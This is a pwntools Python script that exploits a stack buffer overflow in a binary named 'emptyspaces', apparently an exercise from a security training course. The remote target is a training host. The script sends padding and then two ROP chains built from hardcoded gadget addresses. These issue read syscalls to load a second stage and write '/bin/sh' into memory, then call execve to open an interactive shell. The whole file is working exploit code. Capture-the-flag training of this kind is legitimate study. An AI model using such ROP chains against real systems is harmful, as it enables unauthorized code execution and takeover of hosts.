import time
from pwn import *

if "REMOTE" not in args:
	r= process('./emptyspaces')
else:
	r = remote("bin.training.jinblack.it", 4006)

code_base=0x400000



#0x00400190 empty space GNU stuff ok to read and write
emptyspace=0x006baf20


#start overflowing
payload=b'a'*72






payload+=p64(0x0044bd36)
#0x000000000044bd36: pop rdx; ret; 
payload+=p64(0xff) #chars to read


#OK


payload+=p64(0x00400696)
#0x0000000000400696: pop rdi; ret; 
payload+=p64(0x0) #useless for read


#ALL REGISTERS OKOK

payload+=p64(0x00474dc5)
#0x0000000000474dc5: syscall; ret; 
#read from old stack pointer (which is in rsi)



gdb.attach(r)
input("start debug")

r.send(payload)
print((payload[137:]))
print(len(payload))

#MULTISTAGE: program is now reading


boom=p64(0x004155a4)
#0x00000000004155a4: pop rax; ret; 
boom+=p64(0x0)

boom+=p64(0x0044bd5a)
#0x000000000044bd5a: pop rsi; ret;
boom+=p64(emptyspace)

boom+=p64(0x00474dc5)
#0x0000000000474dc5: syscall; ret; 
# read again to write /bin/sh 

boom+=p64(0x004155a4)
#0x00000000004155a4: pop rax; ret; 
boom+=p64(0x3b)

boom+=p64(0x0044bd5a)
#0x000000000044bd5a: pop rsi; ret;
boom+=p64(0x0)


boom+=p64(0x00400696)
#0x0000000000400696: pop rdi; ret; 
boom+=p64(emptyspace)

boom+=p64(0x0044bd36)
#0x000000000044bd36: pop rdx; ret; 
boom+=p64(0x0)

boom+=p64(0x00474dc5)
#0x0000000000474dc5: syscall; ret; 
#execve



input("send multistage payload")
r.send(b"a"*0x70+boom)

input("send binsh to emptyspace")
r.send(b'/bin/sh\x00')
r.interactive()
